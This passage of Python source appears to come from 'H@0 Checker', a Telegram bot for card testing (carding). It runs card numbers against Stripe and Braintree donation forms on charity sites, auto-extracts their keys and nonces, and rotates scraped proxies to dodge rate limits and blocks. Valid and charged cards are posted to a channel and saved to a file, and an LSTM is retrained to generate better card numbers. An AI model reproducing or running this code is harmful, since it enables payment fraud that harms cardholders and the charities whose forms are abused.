            min_v = s.get('random_amount_min', '1.00')
            max_v = s.get('random_amount_max', '5.00')
            await message.reply(
                f"<b>✅  CONFIG #{cid} RANDOM AMOUNT {icon}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎲  Random: <b>{icon}</b>\n"
                f"📉  Min: <code>${min_v}</code>\n"
                f"📈  Max: <code>${max_v}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        if setting_key in ('amount', 'minamount', 'maxamount') and cfg_gt == 'stripe':
            try:
                val = float(setting_value)
                if val <= 0:
                    raise ValueError("Must be positive")
                setting_value = f"{val:.2f}"
            except (ValueError, TypeError):
                await message.reply(f"❌ Invalid amount: <code>{setting_value}</code>\nMust be a positive number (e.g. 1.00)", parse_mode='HTML')
                return

        if cfg_gt == "braintree":
            key_map = {
                'site': ('site_url', '🌐 Site URL'),
                'url': ('site_url', '🌐 Site URL'),
                'cartpath': ('add_to_cart_path', '🛒 Cart Path'),
                'checkoutpath': ('checkout_path', '💳 Checkout Path'),
                'paymethod': ('payment_method_id', '🆔 Payment Method ID'),
                'product': ('product_payload', '📦 Product Payload'),
            }
        else:
            key_map = {
                'site': ('site_url', '🌐 Site URL'),
                'url': ('site_url', '🌐 Site URL'),
                'path': ('donate_path', '📄 Donate Path'),
                'amount': ('donation_amount', '💰 Amount'),
                'minamount': ('random_amount_min', '📉 Min Amount'),
                'maxamount': ('random_amount_max', '📈 Max Amount'),
                'key': ('pub_key', '🔑 Pub Key'),
                'pubkey': ('pub_key', '🔑 Pub Key'),
                'account': ('stripe_account', '🏷 Account'),
                'acct': ('stripe_account', '🏷 Account'),
                'campaign': ('campaign_id', '📋 Campaign'),
            }
        if setting_key not in key_map:
            valid_keys = ', '.join(sorted(set(k for k in key_map.keys())))
            await message.reply(
                f"❌ Unknown setting: <code>{setting_key}</code>\n\n"
                f"Gate: <b>{cfg_gt.upper()}</b>\n"
                f"Valid: <code>{valid_keys}</code>",
                parse_mode='HTML'
            )
            return
        config_key, display_name = key_map[setting_key]
        set_config_setting(cid, config_key, setting_value)
        logger.info(f"Config #{cid} updated by admin {message.from_user.id}: {config_key} = {setting_value[:50]}")
        await message.reply(
            f"<b>✅  CONFIG #{cid} UPDATED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📛  {cfg['name']}\n"
            f"{display_name}:\n"
            f"<code>{setting_value}</code>\n\n"
            f"Use <code>/editconfig {cid}</code> to see full config.\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['setupconfig'])
    async def cmd_setupconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args:
            await message.reply(
                "<b>⚡  SETUP CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "📌  Just provide <b>config ID</b> + <b>site URL</b>\n"
                "Gate type auto-detected!\n\n"
                "<b>🤖  AUTO-DETECTED</b>\n"
                "🔍  Gate type (Stripe/Braintree)\n"
                "🔑  Pub Key / Token\n"
                "🏷  Account / Payment ID\n"
                "📋  All paths & settings\n\n"
                "<b>📝  USAGE</b>\n"
                "<code>/setupconfig [id] [url]</code>\n"
                "<code>/setupconfig [id] [url] [pk]</code>\n\n"
                "<b>📌  EXAMPLE</b>\n"
                "<code>/setupconfig 2 https://charity.org</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        parts = args.strip().split(None, 2)
        if not parts[0].isdigit() or len(parts) < 2:
            await message.reply(
                "<code>/setupconfig [id] [url]</code>\n"
                "Example: <code>/setupconfig 2 https://charity.org</code>",
                parse_mode='HTML'
            )
            return
        cid = int(parts[0])
        url = parts[1].strip()
        manual_pk = parts[2].strip() if len(parts) > 2 else ""
        cfg = get_config(cid)
        if not cfg:
            await message.reply(f"Config #{cid} not found. Use /configs")
            return
        await message.reply(
            f"<b>🔄  SETTING UP #{cid}...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📛  {cfg['name']}\n"
            f"🌐  <code>{url[:50]}</code>\n"
            f"🔍  Detecting gate type...\n"
            f"⏳  Auto-detecting all settings...\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )
        prev_active = get_active_config_id()
        set_active_config(cid)
        loop = asyncio.get_event_loop()
        try:
            gate_info = await loop.run_in_executor(None, detect_gate_type, url)
            detected_type = gate_info.get("gate_type", "stripe")
            confidence = gate_info.get("confidence", "low")
            signals = gate_info.get("signals", [])

            set_config_gate_type(cid, detected_type)

            if detected_type == "braintree":
                result = await loop.run_in_executor(None, setup_braintree_from_url, url)
                gate_label = "BRAINTREE"
            else:
                result = await loop.run_in_executor(None, setup_gate_from_url, url)
                gate_label = "STRIPE"

            if manual_pk and detected_type == "stripe" and result.get("success"):
                set_gate_setting("stripe", "pub_key", manual_pk)
                set_config_setting(cid, "pub_key", manual_pk)
                result["auto_detected"].append(f"Manual PK: {manual_pk[:20]}...")

            detected_lines = f"  🔍  Gate: <b>{gate_label}</b> ({confidence})\n"
            if signals:
                detected_lines += f"  📡  Signals: <code>{', '.join(signals[:4])}</code>\n"
            for item in result.get("auto_detected", []):
                detected_lines += f"  ✅  <code>{item}</code>\n"

            error_lines = ""
            for err in result.get("errors", []):
                error_lines += f"  ⚠️  <code>{err[:60]}</code>\n"

            if result["success"]:
                settings = get_all_gate_settings(detected_type)
                for k, v in settings.items():
                    set_config_setting(cid, k, v)
                enable_config(cid)
                await message.reply(
                    f"<b>✅  {gate_label} CONFIG #{cid} READY!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📛  {cfg['name']}\n\n"
                    f"<b>🤖  AUTO DETECTED</b>\n"
                    f"{detected_lines}\n"
                    + (f"\n<b>⚠️  WARNINGS</b>\n{error_lines}\n" if error_lines else "")
                    + f"  🟢  Config #{cid} enabled & ready!\n\n"
                    f"<code>/editconfig {cid}</code> to see details\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                settings = get_all_gate_settings(detected_type)
                for k, v in settings.items():
                    if v:
                        set_config_setting(cid, k, v)
                await message.reply(
                    f"<b>⚠️  SETUP PARTIAL #{cid}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    + (f"<b>DETECTED</b>\n{detected_lines}\n" if detected_lines else "")
                    + f"\n<b>ERRORS</b>\n{error_lines}\n"
                    f"Use <code>/setconfig {cid} [key] [value]</code>\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"Setup config #{cid} error: {e}")
            await message.reply(
                f"<b>❌  SETUP FAILED #{cid}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{str(e)[:60]}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        finally:
            set_active_config(prev_active)

    @dp.message_handler(commands=['fixconfig'])
    async def cmd_fixconfig(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return
        args = message.get_args()
        if not args or not args.strip().isdigit():
            await message.reply(
                "<b>🔧  FIX CONFIG</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<code>/fixconfig [id]</code>\n"
                "Runs diagnostic + auto-fix\n"
                "on a specific config.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return
        cid = int(args.strip())
        cfg = get_config(cid)
        if not cfg:
            await message.reply(f"Config #{cid} not found. Use /configs")
            return
        await message.reply(
            f"<b>🔧  FIXING #{cid}...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📛  {cfg['name']}\n"
            f"Checking gate connectivity,\n"
            f"form detection, Stripe key...\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )
        prev_active = get_active_config_id()
        set_active_config(cid)
        try:
            loop = asyncio.get_event_loop()
            diag = await loop.run_in_executor(None, diagnose_gate)
            checks = []
            checks.append(f"  {'✅' if diag['site_reachable'] else '❌'}  Site reachable")
            checks.append(f"  {'✅' if diag['donate_page_ok'] else '❌'}  Donate page OK")
            if diag['pow_required']:
                checks.append(f"  {'✅' if diag['pow_solved'] else '⚠️'}  PoW challenge {'solved' if diag['pow_solved'] else 'FAILED'}")
            checks.append(f"  {'✅' if diag['form_found'] else '❌'}  Charitable form found")
            checks.append(f"  {'✅' if diag['nonce_found'] else '❌'}  Nonce detected")
            checks.append(f"  {'✅' if diag['stripe_key_found'] else '❌'}  Stripe key found")
            all_ok = diag['site_reachable'] and diag['donate_page_ok'] and diag['form_found'] and diag['stripe_key_found']
            overall = "🟢  ALL CHECKS PASSED" if all_ok else "🔴  ISSUES DETECTED"
            checks_str = "\n".join(checks)
            fixes_str = ""
            if diag['fixes_applied']:
                fix_lines = "\n".join(f"  🔧  {f}" for f in diag['fixes_applied'])
                fixes_str = f"\n<b>AUTO-FIXES</b>\n{fix_lines}\n"
                for k, v in get_all_gate_settings("stripe").items():
                    if v:
                        set_config_setting(cid, k, v)
            errors_str = ""
            if diag['errors']:
                err_lines = "\n".join(f"  ⚠️  {e}" for e in diag['errors'])
                errors_str = f"\n<b>ERRORS</b>\n{err_lines}\n"
            key_display = diag['stripe_key'] if diag['stripe_key'] else "Not found"
            await message.reply(
                f"<b>🔧  DIAGNOSTIC #{cid}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📛  {cfg['name']}\n"
                f"{overall}\n\n"
                f"\n<b>CHECKS</b>\n"
                f"{checks_str}\n\n"
                f"\n<b>DETAILS</b>\n"
                f"🌐  <code>{diag['site_url']}</code>\n"
                f"📄  <code>{diag['donate_path']}</code>\n"
                f"🔑  <code>{key_display}</code>\n"
                f"{fixes_str}{errors_str}\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            if all_ok:
                enable_config(cid)
                await message.reply(
                    f"🟢 Config #{cid} auto-enabled (all checks passed)",
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"Fixconfig #{cid} error: {e}")
            await message.reply(
                f"<b>❌  DIAGNOSTIC FAILED #{cid}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{str(e)[:60]}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        finally:
            set_active_config(prev_active)

    @dp.callback_query_handler()
    async def handle_callbacks(callback: CallbackQuery):
        user_id = callback.from_user.id
        username = callback.from_user.username
        data = callback.data

        await callback.answer()

        class FakeMessage:
            def __init__(self, cb):
                self.chat = cb.message.chat
                self.from_user = cb.from_user
                self.bot = cb.bot
                self.message_id = cb.message.message_id
                self._text = ""
            def get_args(self):
                return ""
            async def reply(self, text, **kwargs):
                await self.bot.send_message(self.chat.id, text, **kwargs)
            async def reply_document(self, doc, **kwargs):
                await self.bot.send_document(self.chat.id, doc, **kwargs)

        fake_msg = FakeMessage(callback)

        admin_actions = ["start_bot", "stop_bot", "approved", "keys", "proxy", "gateon", "gateoff", "parallel_on", "parallel_off", "masscheck", "mc_stop", "mc_ch_on", "mc_ch_off", "proxy_on", "proxy_off", "scrub_now"]
        auth_actions = ["panel", "stats", "gate", "bins", "configs", "help", "mycards", "myerrors"]

        admin_prefixes = ["cfgon_", "cfgoff_", "cfgswitch_"]
        is_admin_prefix = any(data.startswith(p) for p in admin_prefixes)

        if data in admin_actions or is_admin_prefix:
            if not is_admin(user_id, username):
                await callback.message.reply("🔒 Access denied.", parse_mode='HTML')
                return
        elif data in auth_actions:
            if not is_authorized(user_id, username):
                await callback.message.reply("🔒 Access denied.", parse_mode='HTML')
                return

        if data == "panel":
            await cmd_panel(fake_msg)
        elif data == "stats":
            await send_stats_to_channel(callback.bot, callback.message.chat.id)
        elif data == "gate":
            await cmd_gate(fake_msg)
        elif data == "bins":
            await cmd_bins(fake_msg)
        elif data == "proxy":
            await cmd_proxy(fake_msg)
        elif data == "configs":
            await cmd_configs(fake_msg)
        elif data == "start_bot":
            await cmd_start(fake_msg)
        elif data == "stop_bot":
            await cmd_stop(fake_msg)
        elif data == "approved":
            await cmd_approved(fake_msg)
        elif data == "keys":
            await cmd_keys(fake_msg)
        elif data == "help":
            await cmd_help(fake_msg)
        elif data == "gateon":
            await cmd_gateon(fake_msg)
        elif data == "gateoff":
            await cmd_gateoff(fake_msg)
        elif data == "parallel_on":
            set_parallel_enabled(True)
            await callback.bot.send_message(
                callback.message.chat.id,
                "🔀  Parallel mode: <b>🟢 ON</b>\n"
                "All enabled configs will check simultaneously.",
                parse_mode='HTML'
            )
        elif data == "parallel_off":
            set_parallel_enabled(False)
            await callback.bot.send_message(
                callback.message.chat.id,
                "🔀  Parallel mode: <b>🔴 OFF</b>\n"
                "Only active config will be used.",
                parse_mode='HTML'
            )
        elif data == "mycards":
            await cmd_mycards(fake_msg)
        elif data == "myerrors":
            await cmd_myerrors(fake_msg)
        elif data == "masscheck":
            await cmd_masscheck(fake_msg)
        elif data == "mc_stop":
            uid = str(user_id)
            if uid in _mass_check_running:
                _mass_check_cancel[uid] = True
                await callback.bot.send_message(
                    callback.message.chat.id,
                    "<b>⏹  STOPPING MASS CHECK...</b>\n━━━━━━━━━━━━━━━━━━━━\n\n<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            else:
                await callback.bot.send_message(callback.message.chat.id, "No mass check running.", parse_mode='HTML')
        elif data == "mc_ch_on":
            set_notify("live", True)
            await callback.bot.send_message(
                callback.message.chat.id,
                "<b>📡  CHANNEL SEND: 🟢 ON</b>\n━━━━━━━━━━━━━━━━━━━━\n\nLive cards will be sent to channel.\n\n<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif data == "mc_ch_off":
            set_notify("live", False)
            await callback.bot.send_message(
                callback.message.chat.id,
                "<b>📡  CHANNEL SEND: 🔴 OFF</b>\n━━━━━━━━━━━━━━━━━━━━\n\nLive cards will NOT be sent to channel.\n\n<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif data == "proxy_on":
            set_proxy_enabled(True)
            await callback.bot.send_message(
                callback.message.chat.id,
                "<b>✅  PROXY ENABLED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢  Proxies are <b>ON</b>\n"
                f"📊  Pool: <code>{get_pool_size()}</code> / <code>{TARGET_LIVE}</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif data == "proxy_off":
            set_proxy_enabled(False)
            await callback.bot.send_message(
                callback.message.chat.id,
                "<b>✅  PROXY DISABLED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔴  Proxies are <b>OFF</b>\n"
                "All requests go <b>DIRECT</b>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif data == "scrub_now":
            await callback.bot.send_message(
                callback.message.chat.id,
                "<b>🔄  SCRUB STARTED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⏳  Scrubbing with <code>{MAX_WORKERS}</code> workers...\n"
                "This may take 1-2 minutes.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            try:
                result = await full_scrape_and_scrub()
                scrub = get_scrub_stats()
                await callback.bot.send_message(
                    callback.message.chat.id,
                    "<b>✅  SCRUB COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊  Live: <code>{len(result)}</code> / <code>{TARGET_LIVE}</code>\n"
                    f"📥  Scraped: <code>{scrub.get('total_scraped', 0)}</code> raw\n"
                    f"💀  Dead: <code>{scrub.get('dead_removed', 0)}</code>\n"
                    f"⚡  Avg Latency: <code>{scrub.get('avg_latency', 0)}ms</code>\n\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            except Exception as e:
                await callback.bot.send_message(
                    callback.message.chat.id,
                    f"<b>❌  SCRUB FAILED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n<code>{str(e)[:80]}</code>\n\n<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
        elif data.startswith("cfgon_"):
            try:
                cfg_id = int(data.split("_")[1])
                enable_config(cfg_id)
                cfg_info = get_config(cfg_id)
                name = cfg_info['name'] if cfg_info else f"Config #{cfg_id}"
                await callback.bot.send_message(
                    callback.message.chat.id,
                    f"<b>✅  CONFIG #{cfg_id} ENABLED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🟢  <b>{name}</b> is now <b>ON</b>\n\n<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            except Exception:
                await callback.bot.send_message(callback.message.chat.id, "❌ Invalid config ID.", parse_mode='HTML')
        elif data.startswith("cfgoff_"):
            try:
                cfg_id = int(data.split("_")[1])
                disable_config(cfg_id)
                cfg_info = get_config(cfg_id)
                name = cfg_info['name'] if cfg_info else f"Config #{cfg_id}"
                await callback.bot.send_message(
                    callback.message.chat.id,
                    f"<b>✅  CONFIG #{cfg_id} DISABLED</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔴  <b>{name}</b> is now <b>OFF</b>\n\n<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
            except Exception:
                await callback.bot.send_message(callback.message.chat.id, "❌ Invalid config ID.", parse_mode='HTML')
        elif data.startswith("cfgswitch_"):
            try:
                cfg_id = int(data.split("_")[1])
                if set_active_config(cfg_id):
                    cfg_info = get_config(cfg_id)
                    name = cfg_info['name'] if cfg_info else f"Config #{cfg_id}"
                    gt = cfg_info.get('gate_type', 'stripe').upper() if cfg_info else "?"
                    await callback.bot.send_message(
                        callback.message.chat.id,
                        f"<b>✅  SWITCHED TO #{cfg_id}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"⬅️  Active: <b>#{cfg_id}</b> · {name}\n"
                        f"🛡  Gate: <b>{gt}</b>\n\n<code>━━ H@0 ━━</code>",
                        parse_mode='HTML'
                    )
                else:
                    await callback.bot.send_message(callback.message.chat.id, f"❌ Config #{cfg_id} not found.", parse_mode='HTML')
            except Exception:
                await callback.bot.send_message(callback.message.chat.id, "❌ Invalid config ID.", parse_mode='HTML')


def get_active_chat_id():
    custom = get_custom_chat_id()
    if custom is not None:
        return custom
    try:
        return int(TELEGRAM_CHAT_ID) if TELEGRAM_CHAT_ID else 0
    except ValueError:
        return 0


async def checking_loop(bot, chat_id, crawler):
    PHOTO_PATH = os.path.join(BASE_DIR, "scrap.jpg")
    APPROVED_FILE = os.path.join(BASE_DIR, "approved.txt")
    PAUSE_BETWEEN_MESSAGES = 1.5
    CRAWL_INTERVAL = 8
    STATS_INTERVAL = 50

    logger.info("H@0 Checker V6.0 - Stripe + Braintree Gates - Starting 24/7 cycle")

    while True:
        try:
            if not bot_running:
                await asyncio.sleep(3)
                continue

            any_enabled = False
            for cid_check, cfg_check in get_all_configs().items():
                if cfg_check.get("enabled", False):
                    any_enabled = True
                    break
            if not any_enabled:
                await asyncio.sleep(3)
                continue

            if is_proxy_enabled() and get_pool_size() == 0 and not has_custom_proxies():
                logger.warning("Proxy pool empty - waiting for scrub cycle to refill...")
                while is_proxy_enabled() and get_pool_size() == 0 and not has_custom_proxies():
                    await asyncio.sleep(10)
                logger.info(f"Proxies available again: {get_pool_size()} in pool")

            cards = await crawler.crawl_batch()
            approved_batch = []
            SESSION_STATS['cycles'] += 1

            for card_str in cards:
                if not bot_running:
                    break

                parts = card_str.split('|')
                if len(parts) < 4:
                    continue
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

                is_valid, check_reason = full_card_check(card_str)
                if not is_valid:
                    logger.debug(f"Pre-check failed {cc[:6]}: {check_reason}")
                    continue

                configs_to_check = []
                if is_parallel_enabled():
                    en = get_enabled_configs()
                    configs_to_check = list(en.keys()) if en else [get_active_config_id()]
                else:
                    configs_to_check = [get_active_config_id()]

                for check_cid in configs_to_check:
                    if not bot_running:
                        break
                    check_cfg = get_config(check_cid)
                    if not check_cfg or not check_cfg.get("enabled", False):
                        continue

                    cfg_gate_type = get_config_gate_type(check_cid)
                    prev_active = get_active_config_id()
                    set_active_config(check_cid)

                    is_live, tag, detail, gate_name, proxy_used, check_time = await crawler.check_card(card_str, gate_type=cfg_gate_type)
                    SESSION_STATS['total_checked'] += 1
                    update_config_stats(check_cid, 'checked')

                    set_active_config(prev_active)

                    cfg_label = f" [#{check_cid}]" if is_parallel_enabled() else ""
                    active_chat = get_active_chat_id()

                    detail_lower = detail.lower() if detail else ""
                    is_gate_error = detail == "Gate Error" or tag == "ERROR"
                    is_rate_limit = any(s in detail_lower for s in ["rate limit", "too many requests", "429", "temporarily unavailable"])
                    is_blocked = any(s in detail_lower for s in ["blocked", "forbidden", "403", "access denied", "captcha", "cloudflare"])
                    is_network = any(s in detail_lower for s in ["timeout", "connection", "proxy failed", "cannot reach", "ssl"])
                    is_api_protection = is_rate_limit or is_blocked

                    if is_gate_error or is_api_protection or is_network:
                        SESSION_STATS['total_errors'] += 1
                        update_config_stats(check_cid, 'errors')
                        crawler._consecutive_errors += 1

                        err_type = "RATE LIMIT" if is_rate_limit else ("BLOCKED" if is_blocked else ("NETWORK" if is_network else "ERROR"))

                        if get_notify("errors"):
                            bin_info_err = await safe_bin_info(crawler, cc[:6])
                            err_msg_text = fmt_error_msg(card_str, cc, cvv, bin_info_err, gate_name, detail, proxy_used if proxy_used else "DIRECT", err_type, cfg_label, check_time)
                            try:
                                await bot.send_message(active_chat, err_msg_text, parse_mode='HTML')
                            except Exception as send_err:
                                logger.debug(f"Error msg send failed: {send_err}")

                        if is_api_protection:
                            cooldown = random.uniform(15, 30) if is_blocked else random.uniform(8, 15)
                            logger.warning(f"API protection triggered ({err_type}): {detail[:50]} - backing off {cooldown:.0f}s")
                            await asyncio.sleep(cooldown)
                        elif is_network:
                            await asyncio.sleep(random.uniform(3, 8))

                        if crawler._consecutive_errors >= 10:
                            logger.warning("Too many consecutive errors - cooling down 30s")
                            await asyncio.sleep(30)
                            crawler._consecutive_errors = 0
                        continue

                    crawler._consecutive_errors = 0
                    proxy_display = proxy_used if proxy_used else "DIRECT"
                    logger.info(f"[{tag}] {cc[:6]}*** | {gate_name}{cfg_label} | Proxy: {proxy_display} | {detail[:60]}")

                    if is_live:
                        SESSION_STATS['total_live'] += 1
                        update_config_stats(check_cid, 'live')
                        SESSION_STATS['last_live_time'] = int(time.time())

                        if tag == "CHARGED":
                            SESSION_STATS['charged'] += 1
                            update_config_stats(check_cid, 'charged')

                        bin_info = await safe_bin_info(crawler, cc[:6])
                        live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, cfg_label, check_time)

                        keyboard = InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
                        ])

                        if get_notify("live"):
                            for send_attempt in range(3):
                                try:
                                    if os.path.exists(PHOTO_PATH):
                                        await bot.send_photo(
                                            active_chat,
                                            photo=InputFile(PHOTO_PATH),
                                            caption=live_message,
                                            reply_markup=keyboard,
                                            parse_mode='HTML'
                                        )
                                    else:
                                        await bot.send_message(active_chat, live_message, reply_markup=keyboard, parse_mode='HTML')

                                    logger.info(f"LIVE SENT to channel: {cc[:6]} via {gate_name}{cfg_label}")
                                    break
                                except Exception as e:
                                    err_msg = str(e).lower()
                                    if 'retry after' in err_msg or 'too many requests' in err_msg:
                                        retry_secs = 10
                                        try:
                                            retry_secs = int(''.join(filter(str.isdigit, str(e)[:20]))) or 10
                                        except (ValueError, TypeError):
                                            pass
                                        logger.warning(f"Telegram rate limit - waiting {retry_secs}s")
                                        await asyncio.sleep(retry_secs + 1)
                                    elif send_attempt == 2:
                                        logger.error(f"Telegram send failed after 3 attempts: {e}")
                                    else:
                                        await asyncio.sleep(2)

                        approved_batch.append(card_str)
                        await asyncio.sleep(PAUSE_BETWEEN_MESSAGES)
                    else:
                        SESSION_STATS['total_dead'] += 1
                        update_config_stats(check_cid, 'dead')

                        if get_notify("decline"):
                            bin_info_dec = await safe_bin_info(crawler, cc[:6])
                            decline_msg = fmt_dead_msg(card_str, cc, cvv, bin_info_dec, gate_name, detail, proxy_display, cfg_label, check_time)
                            try:
                                await bot.send_message(active_chat, decline_msg, parse_mode='HTML')
                            except Exception as send_err:
                                logger.debug(f"Decline msg send failed: {send_err}")
                            await asyncio.sleep(0.5)

            if approved_batch:
                try:
                    with open(APPROVED_FILE, 'a') as f:
                        for c in approved_batch:
                            f.write(c + '\n')
                except Exception as e:
                    logger.error(f"File write error: {e}")
                crawler._smart_gen_live_count += len(approved_batch)
                if crawler._smart_gen_live_count >= 5:
                    try:
                        loop = asyncio.get_event_loop()
                        await loop.run_in_executor(None, retrain_smart_gen)
                        crawler._smart_gen_live_count = 0
                        logger.info("LSTM model retrained with new live cards")
                        try:
                            retrain_msg = (
                                f"🧠 <b>LSTM AUTO-RETRAIN</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"✅ Model retrained with new live cards\n"
                                f"📊 Total live: <code>{SESSION_STATS['total_live']}</code>\n"
                                f"🎯 Better card generation active\n\n"
                                f"<code>━━ H@0 ━━</code>"
                            )
                            await bot.send_message(get_active_chat_id(), retrain_msg, parse_mode='HTML')
                        except Exception:
                            pass
                    except Exception as e:
                        logger.warning(f"LSTM retrain failed: {e}")

            if SESSION_STATS['cycles'] % STATS_INTERVAL == 0 and SESSION_STATS['cycles'] > 0:
                await send_stats_to_channel(bot, get_active_chat_id())

        except Exception as e:
            logger.error(f"Critical Loop Error: {e}")
            SESSION_STATS['total_errors'] += 1
            await asyncio.sleep(15)

        rl_status = get_rate_limiter().get_stats()
        logger.info(
            f"Cycle {SESSION_STATS['cycles']} | "
            f"Checked: {SESSION_STATS['total_checked']} | "
            f"Live: {SESSION_STATS['total_live']} | "
            f"Dead: {SESSION_STATS['total_dead']} | "
            f"Proxies: {get_pool_size()} | "
            f"RL: {rl_status.get('requests_in_window', 0)}/20 rpm, backoff={rl_status.get('backoff_level', 0)}"
        )
        await asyncio.sleep(CRAWL_INTERVAL)


async def main_loop():
    global crawler_instance

    BOT_TOKEN = TELEGRAM_BOT_TOKEN
    try:
        CHAT_ID = int(TELEGRAM_CHAT_ID) if TELEGRAM_CHAT_ID else 0
    except ValueError:
        CHAT_ID = 0

    if not BOT_TOKEN or BOT_TOKEN == 'PASTE_YOUR_BOT_TOKEN_HERE' or CHAT_ID == 0:
        logger.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID — fill them in src/config.py")
        return

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(bot)
    crawler = CCCrawler()
    crawler_instance = crawler

    register_handlers(dp)

    logger.info(f"Running initial proxy scrape + scrub... targeting {TARGET_LIVE} live proxies")
    await full_scrape_and_scrub()
    load_proxies()

    if is_proxy_enabled() and not has_custom_proxies():
        retries = 0
        while get_live_count() < TARGET_LIVE and retries < 5:
            logger.warning(f"Only {get_live_count()}/{TARGET_LIVE} live proxies - scrubbing more (attempt {retries+1}/5)...")
            await asyncio.sleep(10)
            await full_scrape_and_scrub()
            load_proxies()
            retries += 1
        if get_live_count() == 0:
            logger.warning("No live proxies found after retries - continuing anyway, monitor will refill")

    logger.info(f"Live proxy pool ready: {get_live_count()}/{TARGET_LIVE} proxies available")

    async def _proxy_stats_callback(stats):
        clear_blacklist()
        load_proxies()
        pool_count = get_pool_size()
        logger.info(f"Proxy pool refreshed: {pool_count} proxies (blacklist cleared)")
        try:
            scrub = get_scrub_stats()
            avg_lat = scrub.get('avg_latency', 0)
            scraped = scrub.get('total_scraped', 0)
            dead = scrub.get('dead_removed', 0)
            s_ok = scrub.get('sources_ok', 0)
            s_fail = scrub.get('sources_fail', 0)
            scrub_msg = (
                f"🔄 <b>AUTO SCRUB COMPLETE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 Live: <code>{pool_count}</code> / <code>{TARGET_LIVE}</code>\n"
                f"📥 Scraped: <code>{scraped}</code> · Dead: <code>{dead}</code>\n"
                f"🌐 Sources: <code>{s_ok}</code> OK · <code>{s_fail}</code> fail\n"
                f"⚡ Latency: <code>{avg_lat}ms</code> avg\n"
                f"🔄 Workers: <code>{MAX_WORKERS}</code>\n"
                f"🗑 Blacklist cleared\n"
                f"⏱ Next in 5 min\n\n"
                f"<code>━━ H@0 ━━</code>"
            )
            await bot.send_message(get_active_chat_id(), scrub_msg, parse_mode='HTML')
            if get_notify("proxy_file"):
                await _send_proxy_file_to_channel(get_active_chat_id())
        except Exception:
            pass

    async def _refill_callback(new_count):
        clear_blacklist()
        load_proxies()
        logger.info(f"Auto-refill done: {new_count} live proxies loaded (blacklist cleared)")
        try:
            scrub = get_scrub_stats()
            avg_lat = scrub.get('avg_latency', 0)
            fill_pct = f"{(new_count / TARGET_LIVE * 100):.0f}%" if TARGET_LIVE > 0 else "N/A"
            refill_msg = (
                f"⚡ <b>PROXY AUTO-REFILL</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️  Pool dropped below <code>{REFILL_THRESHOLD}</code>\n"
                f"📊 Refilled: <code>{new_count}</code> / <code>{TARGET_LIVE}</code> ({fill_pct})\n"
                f"⚡ Avg Latency: <code>{avg_lat}ms</code>\n"
                f"🗑 Blacklist cleared\n\n"
                f"<code>━━ H@0 ━━</code>"
            )
            await bot.send_message(get_active_chat_id(), refill_msg, parse_mode='HTML')
            if get_notify("proxy_file"):
                await _send_proxy_file_to_channel(get_active_chat_id())
        except Exception:
            pass

